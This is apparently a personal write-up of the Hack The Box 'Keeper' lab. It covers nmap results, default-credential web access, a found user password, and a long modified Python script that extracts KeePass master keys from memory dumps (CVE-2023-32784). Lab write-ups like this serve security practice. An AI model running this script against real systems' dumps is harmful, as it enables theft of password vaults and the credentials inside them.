
### Initial access
Nmap
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKHZRUyrg9VQfKeHHT6CZwCwu9YkJosNSLvDmPM9EC0iMgHj7URNWV3LjJ00gWvduIq7MfXOxzbfPAqvm2ahzTc=
|   256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBe5w35/5klFq1zo5vISwwbYSVy1Zzy+K9ZCt0px+goO
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login
|_http-favicon: Unknown favicon MD5: CF60F068F7A5343704B608CCE387F31F
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

Using default password `root:passsword` to login web
See web version `RT 4.4.4+dfsg-2ubuntu1 `

Wee found new user `lnorgaard`
![[Assets/Pasted image 20260908122318.png]]
Enter Admin cat to choose user `Inorgaard` and get infomation about password
![[Assets/Pasted image 20260908123911.png]]


Searching user and found keepass info
**![[Assets/Pasted image 20260908122915.png]]**

cred `lnorgaard:Welcome2023!`

Get keepass db
```bash
┌──(kali㉿kali)-[~/HTB/Keeper]
└─$ scp lnorgaard@10.129.36.118:~/RT30000.zip RT30000.zip
lnorgaard@10.129.36.118's password: 
Permission denied, please try again.
lnorgaard@10.129.36.118's password: 
Permission denied, please try again.
lnorgaard@10.129.36.118's password: 
RT30000.zip                                                                                                                                                100%   83MB 873.1KB/s   01:37    
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB/Keeper]
└─$ ls
nmap_full  nmap_ports.txt  nmap_sVsC.txt  nmap_vuln.txt  RT30000.zip
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB/Keeper]
└─$ unzip RT30000.zip                                              
Archive:  RT30000.zip
  inflating: KeePassDumpFull.dmp     
 extracting: passcodes.kdbx  
```
### Priv escalation
I use copy fail exploit but we can using the dump file to escatlation using https://github.com/z-jxy/keepass_dump.git
but you need to use this modify python for windows encode
```python
#!/usr/bin/env python3

import argparse
from collections import deque, OrderedDict


def get_args():
    parser = argparse.ArgumentParser(
        description="Tool for extracting masterkey from a KeePass 2.X dump. "
                    "(CVE-2023-32784)"
    )

    parser.add_argument(
        "--recover",
        action="store_true",
        default=False,
        help="Attempt to recover remaining unknown characters",
    )

    parser.add_argument(
        "-f",
        "--file",
        required=True,
        help="Path to the KeePass 2.X dump file",
    )

    parser.add_argument(
        "-w",
        "--wordlist",
        help="Scan the dumpfile against a wordlist",
    )

    parser.add_argument(
        "--skip",
        default=False,
        action="store_true",
        help="Skip bytes when scanning",
    )

    parser.add_argument(
        "--set-skip",
        type=int,
        help="Number of bytes to skip when using --skip",
    )

    parser.add_argument(
        "--full-scan",
        action="store_true",
        default=False,
        help="Full dump scan",
    )

    parser.add_argument(
        "-p",
        "--padding",
        default=0,
        type=int,
        help="Padding for wordlist search",
    )

    parser.add_argument(
        "-o",
        "--output",
        help="Output file for masterkey combinations",
    )

    parser.add_argument(
        "--debug",
        action="store_true",
        default=False,
        help="Print debug information",
    )

    return parser.parse_args()


class KeePassDump:
    def __init__(self, args):
        self.args = args

        with open(args.file, "rb") as f:
            self.mem_dump = f.read()

        self.size = len(self.mem_dump)

        self.combinations = deque()
        self.found = OrderedDict()

        if args.skip:
            print("[*] Skipping bytes")
            self._skip = args.set_skip if args.set_skip else 999
        else:
            self._skip = 0

    def DumpPasswords(self):
        print("[*] Searching for masterkey characters")

        chars = self.dump_pw_chars()

        if chars:
            print(f"[*] Extracted: {{UNKNOWN}}{chars}")

            if self.args.recover:
                combos = get_word_combinations(chars, deque())

                for c in combos:
                    master_key, found = self.recover(c)

                    if found:
                        print(f"[+] masterKey: {master_key}")

                if self.args.output:
                    with open(self.args.output, "w", encoding="utf-8") as f:
                        f.write("\n".join(combos) + "\n")

                    print(
                        f"[*] Saved {len(combos)} combinations to "
                        f"{self.args.output}"
                    )

            return

        print("[-] couldn't find any characters")

    def WordSearch(self):
        print(
            f"[*] Searching for masterkey using {self.args.wordlist}"
        )

        wordlist = build_wordlist(self.args)
        search_results = self.search_dump(wordlist)

        if search_results:
            for result in search_results:
                print(f"[+] masterKey: {result}")

    # ------------------------------------------------------------------
    # Unicode-aware dump scanner
    # ------------------------------------------------------------------

    def dump_pw_chars(self) -> str:
        current_len = 0
        found = OrderedDict()

        if self.args.full_scan:
            print("[*] Full scan... This may take a few seconds.")
            start = 0
            end = self.size
        else:
            start, end = self.__get_jump_points()

        idx = start

        while idx + 1 < end:
            # KeePass bullet character ● = U+25CF = CF 25 in UTF-16LE
            if isAsterisk(self.mem_dump[idx], self.mem_dump[idx + 1]):
                current_len += 1
                idx += 2
                continue

            if current_len:
                char = decode_utf16_char(self.mem_dump, idx)

                if char is not None and is_printable_unicode(char):
                    if current_len not in found:
                        found[current_len] = [char]
                    elif char not in found[current_len]:
                        found[current_len].append(char)

                    if self.args.debug:
                        print(
                            f"[*] {idx} | "
                            f"{'●' * current_len}{char}"
                        )

                current_len = 0

            idx += 1

        return self.display(found)

    def display(self, found: OrderedDict) -> str:
        chars = []

        print("[*] 0:\t{UNKNOWN}")

        for key, values in found.items():
            print(f"[*] {key}:\t", end="")

            if len(values) > 1:
                candidates = "<{" + ", ".join(values) + "}>"
            else:
                candidates = values[0]

            print(candidates)
            chars.append(candidates)

        return "".join(chars)

    # ------------------------------------------------------------------
    # Recovery
    # ------------------------------------------------------------------

    def recover(self, search_word: str, collected=None):
        print(f"[?] Recovering: {search_word}")

        if collected is None:
            collected = deque(search_word)

        key, success = self.extract_and_search(
            search_word,
            collected,
        )

        if success:
            return key, True

        return "", False

    def extract_and_search(
        self,
        search_word: str,
        collected_key_chars: deque,
    ):
        # Search using UTF-16LE instead of ASCII/UTF-8.
        encoded = search_word.encode("utf-16-le")
        idx = self.mem_dump.find(encoded)

        if idx != -1:
            print(
                f"[*] Found UTF-16LE match in dump for: "
                f"{search_word}"
            )

            key, found_count = self.__extract_chars(
                idx,
                len(search_word),
                collected_key_chars,
            )

            if (
                found_count != 0
                and self.mem_dump.find(
                    key.encode("utf-16-le")
                ) != -1
            ):
                return key, True

            return "", False

        print(
            f"[-] Couldn't verify plaintext match in dump for: "
            f"{search_word}"
        )

        return "", False

    # ------------------------------------------------------------------
    # Extract Unicode characters around a known match
    # ------------------------------------------------------------------

    def __extract_chars(
        self,
        start: int,
        chars_len: int,
        collected,
    ):
        print("[*] Extracted chars:\t", end="")

        init_len = len(collected)
        last_len = init_len

        # Move left one UTF-16LE code unit at a time.
        pos = start - 2

        while pos >= 0:
            char = decode_utf16_char(self.mem_dump, pos)

            if char is None or not is_printable_unicode(char):
                break

            collected.appendleft(char)
            pos -= 2

        print("{ ", end="")

        if len(collected) == last_len:
            print("(none)", end="")
        else:
            for x in range(len(collected) - last_len):
                print(collected[x], end="")

        print(" <- -> ", end="")

        last_len = len(collected)

        # Search right after the known string.
        pos = start + (chars_len * 2)

        while pos + 1 < self.size:
            char = decode_utf16_char(self.mem_dump, pos)

            if char is None or not is_printable_unicode(char):
                break

            print(char, end="")
            collected.append(char)

            pos += 2

        print(" }")

        if len(collected) == init_len:
            print("[-] No new chars found")
            return "".join(collected).replace("●", ""), 0

        result = "".join(collected).replace("●", "")

        return result, len(collected) - init_len

    # ------------------------------------------------------------------
    # Wordlist search
    # ------------------------------------------------------------------

    def search_dump(self, wordlist):
        results = {}

        for idx, (word, patterns) in enumerate(wordlist.items()):
            print(
                f"[*] ({idx + 1}/{len(wordlist.keys())}): "
                f"{word}"
            )

            collected, success = self._pattern_search(
                patterns.copy()
            )

            if success:
                char = "".join(collected).replace("●", "")

                print(f"[*] Found string: {char}")

                key, success = self.recover(
                    char,
                    collected,
                )

                if success:
                    results[word] = key
            else:
                print(f"[-] no matches found for: {word}")

        return list(set(results.values()))

    # ------------------------------------------------------------------
    # Pattern searching
    # ------------------------------------------------------------------

    def _char_search_left(
        self,
        patterns: deque,
        collected: OrderedDict,
    ):
        if not patterns:
            return deque(sorted(set(collected.values())))

        target_char = patterns.pop()

        target_idx = self.mem_dump.find(
            target_char.encode("utf-16-le")
        )

        if target_idx != -1:
            collected[target_idx] = target_char

            if self.args.debug:
                print(f"[*] Match for: {target_char}")

            if target_idx - 2600 > 0:
                dbg_str = deque(maxlen=100)

                for i in range(1, 2500):
                    idx = target_idx - 2500 - i

                    if idx < 2:
                        continue

                    char = decode_utf16_char(
                        self.mem_dump,
                        idx,
                    )

                    if char is None:
                        continue

                    if char == "●":
                        dbg_str.append("●")

                    elif dbg_str and is_printable_unicode(char):
                        self.__search_callback(
                            idx,
                            char,
                            dbg_str,
                            collected,
                            patterns,
                        )
                        break

                    dbg_str.clear()

        return self._char_search_left(
            patterns,
            collected,
        )

    def _char_search_right(
        self,
        patterns: deque,
        collected: OrderedDict,
    ):
        if not patterns:
            return deque(sorted(set(collected.values())))

        target_char = patterns.popleft()

        target_idx = self.mem_dump.find(
            target_char.encode("utf-16-le")
        )

        if target_idx != -1:
            collected[target_idx] = target_char

            if self.args.debug:
                print(f"[*] Match for: {target_char}")

            dbg_str = deque(maxlen=100)

            start = target_idx + 2

            for idx in range(start, min(start + 5000, self.size - 1), 2):
                char = decode_utf16_char(
                    self.mem_dump,
                    idx,
                )

                if char is None:
                    continue

                if char == "●":
                    dbg_str.append("●")

                elif dbg_str and is_printable_unicode(char):
                    self.__search_callback(
                        idx,
                        char,
                        dbg_str,
                        collected,
                        patterns,
                    )
                    break

        return self._char_search_right(
            patterns,
            collected,
        )

    def _pattern_search(self, patterns: deque):
        collected = deque()

        left_chars = self._char_search_left(
            patterns.copy(),
            OrderedDict(),
        )

        right_chars = self._char_search_right(
            patterns.copy(),
            OrderedDict(),
        )

        if not left_chars and not right_chars:
            return collected, False

        for i in range(len(left_chars)):
            if left_chars[i] not in right_chars:
                right_chars.insert(i, left_chars[i])

        collected.extend(right_chars)

        return collected, True

    def __search_callback(
        self,
        idx,
        char,
        dbg_str,
        collected,
        patterns,
    ):
        result = f'{"".join(dbg_str)}{char}'

        if result not in collected.values():
            collected[idx] = result

            if result not in patterns:
                if self.args.debug:
                    print(f"[*] Match for: {result}")

                patterns.append(result)

    # ------------------------------------------------------------------
    # Jump points
    # ------------------------------------------------------------------

    def __get_jump_points(self):
        try:
            i = self.mem_dump.index(
                b"(Multiple values)"
            )

            end_search = self.mem_dump.rindex(
                b"(Multiple values)"
            )

            if i != end_search:
                print("[*] Using jump points")
                return i, end_search

            print(
                "[*] Only one jump point found. "
                "Scanning with slower method."
            )

            return 0, self.size - 1

        except ValueError:
            print(
                "[-] Couldn't find jump points in file. "
                "Scanning with slower method."
            )

            return 0, self.size - 1


# ----------------------------------------------------------------------
# Unicode helpers
# ----------------------------------------------------------------------

def decode_utf16_char(mem_dump, idx):
    """
    Decode one UTF-16LE code unit.

    Returns None if the bytes cannot be decoded.
    """

    if idx < 0 or idx + 1 >= len(mem_dump):
        return None

    raw = mem_dump[idx:idx + 2]

    try:
        return raw.decode("utf-16-le")
    except UnicodeDecodeError:
        return None


def is_printable_unicode(char):
    """
    Accept normal printable Unicode characters.

    This intentionally accepts characters such as:
        ø
        å
        æ
        é
        ü
        etc.
    """

    if not char:
        return False

    return char.isprintable() and char not in "\x00\r\n\t"


def isAscii(mem_dump, idx):
    """
    Kept for compatibility with the original script.

    Despite the original name, this now accepts printable
    UTF-16LE Unicode characters.
    """

    char = decode_utf16_char(mem_dump, idx)

    return char is not None and is_printable_unicode(char)


def isAsterisk(x, y):
    """
    ● U+25CF encoded as UTF-16LE:
        CF 25
    """

    return x == 0xCF and y == 0x25


# ----------------------------------------------------------------------
# Combination generation
# ----------------------------------------------------------------------

def get_word_combinations(
    chars,
    combinations,
    current="",
):
    if not chars:
        combinations.append(current)
        return

    if chars.startswith("<{") and "}>" in chars:
        opening_idx = chars.index("<{")
        closing_idx = chars.index("}>")

        options = chars[
            opening_idx + 2:closing_idx
        ].split(", ")

        for option in options:
            get_word_combinations(
                chars[closing_idx + 2:],
                combinations,
                current + option,
            )

    else:
        get_word_combinations(
            chars[1:],
            combinations,
            current + chars[0],
        )

    return combinations


# ----------------------------------------------------------------------
# Wordlist
# ----------------------------------------------------------------------

def build_wordlist(args):
    with open(
        args.wordlist,
        "r",
        encoding="utf-8",
    ) as f:
        wordlist = [
            line.strip()
            for line in f.readlines()
        ]

    candidates = {}

    for word in wordlist:
        candidates[word] = deque(
            [
                f"{'●' * (x + args.padding)}{word[x]}"
                for x in range(len(word))
            ]
        )

    return candidates


# ----------------------------------------------------------------------
# Main
# ----------------------------------------------------------------------

def main(args):
    kpd = KeePassDump(args)

    if args.wordlist:
        kpd.WordSearch()
    else:
        kpd.DumpPasswords()


if __name__ == "__main__":
    main(get_args())
```

After get a pass an still fail , it seem mismatch of the word searching in the google for correct word ,extract putty for id_rsa to  root 
This challenges is bull shit.